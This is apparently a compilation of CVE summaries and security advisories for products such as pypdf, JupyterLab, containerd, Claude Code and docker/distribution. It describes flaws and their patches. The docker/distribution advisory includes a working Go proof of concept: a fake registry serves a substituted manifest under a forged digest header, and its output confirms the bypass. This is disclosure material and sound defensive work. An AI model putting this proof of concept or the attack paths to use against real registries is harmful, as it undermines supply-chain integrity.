cves.summary: Directory traversal vulnerability in Microsoft NetMeeting 3.01 2000 before SP4 allows remote attackers to read arbitrary files via "..\.." (dot dot) sequences in a file transfer request.
Microsoft NetMeeting 3.01 2000 before SP4 allows remote attackers to cause a denial of service (shutdown of NetMeeting conference) via malformed packets, as demonstrated via the chat conversation.

Stack-based buffer overflow in Active Directory in Windows 2000 before SP4 allows remote attackers to cause a denial of service (reboot) and possibly execute arbitrary code via an LDAP version 3 search request with a large number of (1) "AND," (2) "OR," and possibly other statements, which causes LSASS.EXE to crash.

In multiple functions, there is a possible out of bounds write due to an integer overflow. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.
Buffer overflow in Xvt 2.1 in Debian Linux 2.2 allows local users to execute arbitrary code via long (1) -name and (2) -T arguments.
Format string vulnerability in nvi before 1.79 allows local users to gain privileges via format string specifiers in a filename.
Buffer overflow in BNU UUCP daemon (uucpd) through long hostnames.
Directory traversal vulnerability in the HTTP server for BPM Studio Pro 4.2 allows remote attackers to read arbitrary files via a .. (dot dot) in the HTTP request.

### Impact

An attacker who uses this vulnerability can craft a PDF which leads to long runtimes. This requires a partially malformed `/FlateDecode` stream, where the byte-by-byte decompression is used.

### Patches

This has been fixed in [pypdf==6.18.1](https://github.com/py-pdf/pypdf/releases/tag/6.18.1).

### Workarounds

If you cannot upgrade yet, consider applying the changes from PR [#4073](https://github.com/py-pdf/pypdf/pull/4073).

### Impact

An attacker who uses this vulnerability can craft a PDF which leads to large memory consumption. This requires parsing the `/Widths` entry of a TrueType or Type1 fonts with unusually large values, for example during text extraction.

### Patches

This has been fixed in [pypdf==6.18.1](https://github.com/py-pdf/pypdf/releases/tag/6.18.1).

### Workarounds

If you cannot upgrade yet, consider applying the changes from PR [#4072](https://github.com/py-pdf/pypdf/pull/4072).
Race condition in SSH Tectia Server 4.0.3 and 4.0.4 for Unix, when the password change plugin (ssh-passwd-plugin) is enabled, allows local users to obtain the server's private key.

Services in ScriptLogic 4.01, and possibly other versions before 4.14, process client requests at raised privileges, which allows remote attackers to (1) modify arbitrary registry entries via the ScriptLogic RPC service (SLRPC) or (2) modify arbitrary configuration via the RunAdmin services (SLRAserver.exe and SLRAclient.exe).
ScriptLogic 4.01, and possibly other versions before 4.14, uses insecure permissions for the LOGS$ share, which allows users to modify log records and possibly execute arbitrary code.

Sun Java Runtime Environment (JRE) and SDK 1.4.0_01 and earlier allows untrusted applets to access certain information within trusted applets, which allows attackers to bypass the restrictions of the Java security model.
pt_chmod in Solaris 8 does not call fdetach to reset terminal privileges when users log out of terminals, which allows local users to write to other users' terminals by modifying the ACL of a TTY.

The log files in Apache web server contain information directly supplied by clients and does not filter or quote control characters, which could allow remote attackers to hide HTTP requests and spoof source IP addresses when logs are viewed with UNIX programs such as cat, tail, and grep.
Directory traversal vulnerability in Carello 1.3 allows remote attackers to execute programs on the server via a .. (dot dot) in the VBEXE parameter.

Heap-based buffer overflow in the message decoding functionality for PGP Outlook Encryption Plug-In, as used in NAI PGP Desktop Security 7.0.4, Personal Security 7.0.3, and Freeware 7.0.3, allows remote attackers to modify the heap and gain privileges via a large, malformed mail message.
Cross-Site Request Forgery (CSRF) vulnerability in FuseTalk 2.0 allows remote attackers to create arbitrary accounts via a link to adduser.cfm.

## Description

A Markdown file or a notebook output can carry a button that runs a JupyterLab command. Since 4.5.7 the first click on such a button opens a prompt naming the command, with Cancel, Run Once and Trust. Choosing Trust runs the command and marks the document trusted, so its later buttons run without a prompt.

Which document gets marked is decided when the user answers, not when they click. Both trust commands read whichever document is current at that moment: `markdownviewer:trust` uses `tracker.currentWidget`, and `notebook:trust` uses the equivalent lookup. If another document becomes current while the prompt is open, that document is the one marked trusted, and the one the user was looking at stays untrusted.

Users are affected if all of the following are true:

- they run JupyterLab 4.5.7 through 4.6.3, or an application that bundles it such as Notebook 7.5+;
- they open a Markdown file or notebook from someone else and click a button in it;
- they answer Trust rather than Cancel or Run Once; and
- a second document becomes the current one while the prompt is open, for example through a workspace restoring at startup, an extension activating a widget, or a command that opens a file

### Impact

The user loses control over which document they trusted. Every button in the document that was (incorrectly) marked as trusted runs from then on without a prompt, so if that document also came from an untrusted source, its buttons fire on a single click with no confirmation. That is the state the prompt was added to prevent, in [GHSA-mqcg-5x36-vfcg](https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-mqcg-5x36-vfcg).

The command that ran had the user's consent, because the prompt named it and they pressed Trust. The document they were reading stays untrusted, so it prompts again on the next click.

#### Notebooks are written to disk

When the document marked is a notebook, the effect outlives the browser session. `notebook:trust` marks every cell trusted and then saves the file, which results in the server signing it, so the notebook stays trusted when it is next opened. The save also writes out any unsaved edits in that notebook. A second confirmation appears first, but it says only that a trusted notebook may execute hidden code, without naming the file, so it does not show the user which notebook is about to be trusted.

A Markdown preview marked this way stays trusted only until it is closed. Nothing is written to disk.

### Patches

JupyterLab [`v4.6.4`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.6.4) and [`v4.5.11`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.5.11) contain the patch. The trust request now carries the document that was clicked, and the command is run only once that same document has been marked.

Users of applications that depend on JupyterLab, such as Notebook v7+, should update `jupyterlab` package too.

### Workarounds

Given the high complexity of a potential exploit, we advise treating this as a defense in-depth and update at earliest opportunity, rather than apply the workarounds listed below. However, for users running in highly sensitive environments who are unable to upgrade the workarounds are included below. 

Turn off command linker, which removes the ability to execute frontend commands altogether:

```json
{
  "@jupyterlab/apputils-extension:sanitizer": {
    "allowCommandLinker": false
  }
}
```

In such configuration the buttons in Markdown files and notebook outputs then do nothing when clicked. Documentation and extensions that use command links for navigation stop working, and the setting applies to every document, not only untrusted ones.

If disabling that setting is not desirable and update is not possible, advise users to choose "Run Once" rather than "Trust". "Run Once" makes the command run but no document is marked, so nothing can be trusted in error.

### Summary

File pattern filters (`denied_patterns` / `allowed_patterns`) were evaluated on the destination of a copy only. A user holding the copy permission could copy a file denied by the filters to a permitted name and then read it. A recursive directory copy reproduced the contents of a restricted directory under a path where the filters do not deny them, and the hide policy was affected in the same way: a file reported as missing by stat and by directory listings could still be copied.

### Details

An authenticated user can read the contents of files that the file pattern filters are configured to deny them. Nothing else is bypassed: the home directory, the virtual folder layout and the per-directory permissions are all still enforced, and both ends of the copy are paths the account can already reach. No access to other accounts and no administrative capability.

The plugin install flow in Claude Code and Claude Desktop checked out a marketplace's pinned commit SHA using `git checkout` without verifying that the resulting HEAD matched the pinned SHA. An attacker controlling a plugin's upstream repository could create a branch named identically to the pinned 40-character SHA, causing the checkout to silently resolve to the attacker's branch tip instead of the reviewed commit, resulting in attacker-controlled code being installed bypassing the pinned hash. Exploitation required a user to install a malicious plugin, pin to a safe hash, and for the plugin source to be hosted on a git host that permitted SHA-shaped branch names.

Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.

Thank you to Or Nevo Michrowski of Air Security for reporting this issue.

cves.summary:
### Impact

A vulnerability exists in containerd's layer unpack handler where the processing of certain image layers causes superlinear time complexity. During the unpack operation, specific file configurations within the layer can trigger repeated directory traversals.

Consequently, pulling or importing a maliciously crafted image can result in increased unpack times and a moderate increase in CPU usage. This delays container startup, even if the compressed image layers are small. Additionally, in orchestrators like Kubernetes that apply concurrency limits to image pulls, these excessively long operations can reduce the available concurrency for other pulls, potentially delaying unrelated container deployments.

### Patches

This bug has been fixed in containerd 2.3.5, 2.2.8, 2.0.12, and 1.7.35. Users should update to these versions to resolve the issue.

### Workarounds

There are no known workarounds for this issue. Users are advised to only pull and import trusted images from known registries until the patch can be applied.

### Credits

The containerd project would like to thank Jakub Ciolek of AlphaSense for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).

### Summary

`registry/client.(*manifests).Get(ctx, dgst, …)` fetches a manifest by digest but never hashes the returned body and compares it against the requested digest. A malicious or compromised registry, or any MITM on the registry connection, can serve arbitrary manifest bytes in response to a digest-pinned request and the client returns the substituted content transparently to the caller. Any application relying on digest pinning for supply-chain integrity ��� image policy controllers, mirrors, pull-through caches — is silently undermined. The bundled pull-through proxy (`registry/proxy/proxymanifeststore.go`) is itself an unguarded consumer and is directly exploitable.

### Details

**Root cause:** `registry/client/repository.go:488-505` reads the response body and passes it directly to `distribution.UnmarshalManifest` without ever computing `digest.FromBytes(body)` and comparing against the caller-supplied `dgst`. The `Docker-Content-Digest` response header is parsed (lines 251-292 in `descriptorFromResponse`) only to populate an out-parameter (`ReturnContentDigest`) and is itself server-supplied — it is never recomputed from the body, so a lying server can set it to whatever value the caller requested while delivering different bytes.

**Attack path:** An attacker who controls the registry endpoint (malicious registry, compromised upstream, DNS hijack, or TLS MITM) responds to `GET /v2/{name}/manifests/{digest}` with:
1. `Docker-Content-Digest: <requested-digest>` (forged header)
2. A body containing a different, attacker-chosen manifest

The client calls `distribution.UnmarshalManifest` on the substituted body, returns the attacker's manifest as if it were the pinned content, and the caller has no way to detect the substitution.

**Why it matters:** The entire value of digest pinning is to guarantee content-addressable integrity against exactly this threat model (hostile or MITM server). The `registry/proxy/proxymanifeststore.go:42-87` pull-through cache calls `remoteManifests.Get(ctx, dgst)` and immediately writes the result to local storage with no re-verification — so a poisoned remote can permanently inject a bad manifest into the mirror cache, affecting all subsequent consumers.

Relevant code path (`repository.go`, simplified):
```go
// line ~496
func (ms *manifests) Get(ctx context.Context, dgst digest.Digest, options ...distribution.ManifestServiceOption) (distribution.Manifest, error) {
    ...
    resp, err := ms.client.Get(u)
    ...
    body, err := ioutil.ReadAll(resp.Body)  // no size limit, no digest check
    ...
    m, _, err := distribution.UnmarshalManifest(ct, body)  // returns attacker bytes
    return m, err
}
```

### PoC

**go.mod:**
```
module poc

go 1.24.10

require (
        github.com/distribution/reference v0.6.0
        github.com/docker/distribution v2.8.3+incompatible
        github.com/opencontainers/go-digest v1.0.0
)

require (
        github.com/beorn7/perks v1.0.1 // indirect
        github.com/docker/go-metrics v0.0.1 // indirect
        github.com/docker/libtrust v0.0.0-20160708172513-aabc10ec26b7 // indirect
        github.com/golang/protobuf v1.3.2 // indirect
        github.com/gorilla/mux v1.8.1 // indirect
        github.com/matttproud/golang_protobuf_extensions v1.0.1 // indirect
        github.com/opencontainers/image-spec v1.1.1 // indirect
        github.com/prometheus/client_golang v1.1.0 // indirect
        github.com/prometheus/client_model v0.0.0-20190129233127-fd36f4220a90 // indirect
        github.com/prometheus/common v0.6.0 // indirect
        github.com/prometheus/procfs v0.0.3 // indirect
        github.com/sirupsen/logrus v1.9.4 // indirect
        golang.org/x/sys v0.13.0 // indirect
)
```

**main.go:**
```go
// PoC: registry/client manifests.Get() does not verify the requested digest
// against the returned body. A malicious registry (or MITM) can serve
// arbitrary content for a digest-pinned manifest reference and the client
// will accept it.
package main

import (
        "context"
        "fmt"
        "net/http"
        "net/http/httptest"

        "github.com/distribution/reference"
        "github.com/docker/distribution/manifest/schema2"
        "github.com/docker/distribution/registry/client"
        "github.com/opencontainers/go-digest"
)

// A real, "trusted" manifest the user pinned by digest.
var trustedManifest = []byte(`{
   "schemaVersion": 2,
   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
   "config": {"mediaType": "application/vnd.docker.container.image.v1+json","size": 1,"digest": "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
   "layers": []
}`)

// A different, attacker-controlled manifest the malicious server returns instead.
var evilManifest = []byte(`{
   "schemaVersion": 2,
   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
   "config": {"mediaType": "application/vnd.docker.container.image.v1+json","size": 1,"digest": "sha256:eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"},
   "layers": []
}`)

func main() {
        pinnedDigest := digest.FromBytes(trustedManifest)
        evilDigest := digest.FromBytes(evilManifest)
        fmt.Println("client requests manifest pinned at:", pinnedDigest)
        fmt.Println("server will instead return content :", evilDigest)

        srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
                // Lie: claim the digest matches what was asked, but serve evil bytes.
                w.Header().Set("Content-Type", schema2.MediaTypeManifest)
                w.Header().Set("Docker-Content-Digest", pinnedDigest.String())
                w.WriteHeader(200)
                w.Write(evilManifest)
        }))
        defer srv.Close()

        name, _ := reference.WithName("library/alpine")
        repo, err := client.NewRepository(name, srv.URL, http.DefaultTransport)
        if err != nil {
                panic(err)
        }
        ms, _ := repo.Manifests(context.Background())

        // Fetch by *digest* — caller expects content-addressed integrity.
        m, err := ms.Get(context.Background(), pinnedDigest)
        if err != nil {
                fmt.Println("Get error:", err)
                return
        }
        _, payload, _ := m.Payload()
        got := digest.FromBytes(payload)

        if got != pinnedDigest {
                fmt.Println()
                fmt.Println(">>> BYPASS: client accepted manifest that does NOT match requested digest")
                fmt.Println("    requested:", pinnedDigest)
                fmt.Println("    received :", got)
        } else {
                fmt.Println("OK: digest verified")
        }
}
```

**Output (v2.8.3+incompatible):**
```
client requests manifest pinned at: sha256:224a436131519692201bd7adb1ab9f9cd95ce26ed21ec70e49972dfd222726de
server will instead return content : sha256:a44b526191ae3f0aa16022abcb7fc1103c23534682c39a2dbe18a5a52fc5002e

>>> BYPASS: client accepted manifest that does NOT match requested digest
    requested: sha256:224a436131519692201bd7adb1ab9f9cd95ce26ed21ec70e49972dfd222726de
    received : sha256:a44b526191ae3f0aa16022abcb7fc1103c23534682c39a2dbe18a5a52fc5002e
```

### Impact

Any application that calls `registry/client.(*manifests).Get()` with a digest argument — and relies on that digest to guarantee which image content it receives — is affected. This includes image policy controllers that enforce allowed digests, pull-through cache/mirror implementations (including the bundled `registry/proxy`), and any CI/CD tooling that pins images by digest for reproducibility or security.

An attacker who controls or can MITM the registry endpoint can substitute arbitrary manifest content — changing image layers, entrypoints, or referenced blobs — and the client will accept and act on the substituted content without warning. The bundled pull-through proxy will cache and re-serve the poisoned manifest to all downstream clients.

Exploitation requires either control of the registry endpoint the victim is configured to use, or a MITM/TLS-breaking position on that connection. No authentication is needed beyond whatever the registry normally requires.

The Allaire Spectra container editor preview tool does not properly enforce object security, which allows an attacker to conduct unauthorized activities via an object-method that is added to the container object with a publishing rule.
Missing authentication for critical function in Azure AI Foundry allows an unauthorized attacker to elevate privileges over a network.

Directory traversal vulnerability in Kai Blankenhorn Bitfolge simple and nice index file (aka snif) before 1.2.5 allows remote attackers to download files from locations above the snif directory.
Buffer overflow in mIRC before 6.11 allows remote attackers to execute arbitrary code via a long irc:// URL.
Directory traversal in Webpaging interface in Internet Software Solutions Air Messenger LAN Server (AMLServer) 3.4.2 allows allows remote attackers to read arbitrary files via a .. (dot dot) attack.
Multiple buffer overflows in libmcrypt before 2.5.5 allow attackers to cause a denial of service (crash).

Memory leak in libmcrypt before 2.5.5 allows attackers to cause a denial of service (memory exhaustion) via a large number of requests to the application, which causes libmcrypt to dynamically load algorithms via libtool.
Netscape Communicator 4.0 through 4.79 allows remote attackers to bypass JVM security and execute arbitrary Java code via an applet that loads user-supplied Java classes.

eTrust InoculateIT 6.0 with the "Incremental Scan" option enabled may certify that a file is free of viruses before the file has been completely downloaded, which allows remote attackers to bypass virus detection.

The Brizy – Page Builder plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the ‘rootAttributes’ parameter in all versions up to, and including, 2.8.14 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with Contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.
Server-side request forgery (ssrf) in Azure AI Foundry allows an unauthorized attacker to elevate privileges over a network.

The Appointment Booking Plugin – LatePoint | Calendar & Scheduling for WordPress plugin for WordPress is vulnerable to Insecure Direct Object Reference in all versions up to, and including, 5.6.9  via the set_customer_object due to missing validation on a user controlled key. This makes it possible for unauthenticated attackers to enumerate arbitrary customer records and disclose personally identifiable information -  including first name, last name, email address, and phone number - by iterating the customer[id] parameter. This issue is exploitable only when the site is configured with customer authentication disabled (guest checkout enabled).
Improper neutralization of input during web page generation ('cross-site scripting') in Azure Portal allows an unauthorized attacker to perform spoofing over a network.
Rejected reason: reserved but not needed
Incorrect authorization in Azure Machine Learning allows an unauthorized attacker to disclose information over a network.
Certain files in MPower in HP-UX 10.x are installed with insecure permissions, which allows local users to gain privileges.
Microsoft Outlook Express 5.5 and 6 allows attackers to cause a denial of service (application crash) via a malformed e-mail header.

libsvn_ra_svn in Subversion 1.0.4 trusts the length field of (1) svn://, (2) svn+ssh://, and (3) other svn protocol URL strings, which allows remote attackers to cause a denial of service (memory consumption) and possibly execute arbitrary code via an integer overflow that leads to a heap-based buffer overflow.
Buffer overflow in CuteFTP 5.0 and 5.0.1 allows local users to cause a denial of service (crash) by copying a long URL into a clipboard.

Buffer overflow in the http_fetch function of HTTP Fetcher 1.0.0 and 1.0.1 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a URL request via a long (1) host, (2) referer, or (3) userAgent value.
ICAL.EXE in iCal 3.7 allows remote attackers to cause a denial of service (crash) via a malformed HTTP request, possibly due to an invalid method name.

TFTP server in Longshine Wireless Access Point (WAP) LCS-883R-AC-B, and in D-Link DI-614+ 2.0 which is based on it, allows remote attackers to obtain the WEP secret and gain administrator privileges by downloading the configuration file (config.img) and other files without authentication.
Netscape 7.0 and Mozilla 5.0 do not immediately delete messages in the trash folder when users select the 'Empty Trash' option, which could allow local users to access deleted messages.
The (1) FTP, (2) POP3, (3) SMTP, and (4) NNTP servers in EServer 2.92 through 2.97, and possibly 2.98, allow remote attackers to cause a denial of service (crash) via a large amount of data.
